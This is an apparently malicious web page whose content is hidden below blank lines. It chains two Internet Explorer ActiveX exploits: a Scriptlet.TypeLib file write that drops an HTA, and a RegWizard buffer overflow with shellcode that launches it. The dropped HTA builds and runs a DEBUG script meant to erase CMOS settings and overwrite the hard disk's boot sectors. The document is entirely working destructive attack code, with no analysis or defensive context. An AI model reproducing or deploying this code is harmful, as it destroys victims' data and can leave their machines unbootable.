<html>
<head> </head>
<BODY>
<pre>


























<object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object>
<script>
scr.Path="C:\\Netmonn.hta";
scr.Doc="<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>wsh.Run('command /c echo fcs:200 400 0 >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo fcs:200 400 0 >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo acs:100  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov ax, 0  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov ax, cx >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo out 70, al  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov ax, 0  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo out 71,al  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo inc cx >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo cmp cx,100  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo jb 103  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov ax,302  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov bx,200  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov cx,1  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo mov dx,80  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo int 13   >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo    >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo g  >>c:\\\\repair.dbg',true,1);wsh.Run('command /c echo q   >>c:\\\\repair.dbg',true,1);wsh.Run('command /c debug < repair.dbg',true,1)</"+"SCRIPT>";scr.write();
</script>


<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
<script language="VbScript" >

expstr = "/i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
expstr = expstr & Chr(235)
expstr = expstr & Chr(53)
expstr = expstr & Chr(208)
expstr = expstr & Chr(127)
expstr = expstr + Chr(144)
expstr = expstr + Chr(139) + Chr(252)
expstr = expstr + Chr(131) + Chr(199) + Chr(25)
expstr = expstr + Chr(80)
expstr = expstr + Chr(87)
expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + Chr(51) + Chr(192)
expstr = expstr + Chr(80)
expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + "mshta c:\Netmonn.hta"

RegWizObj.InvokeRegWizard(expstr)

</script>
</body>
</html>
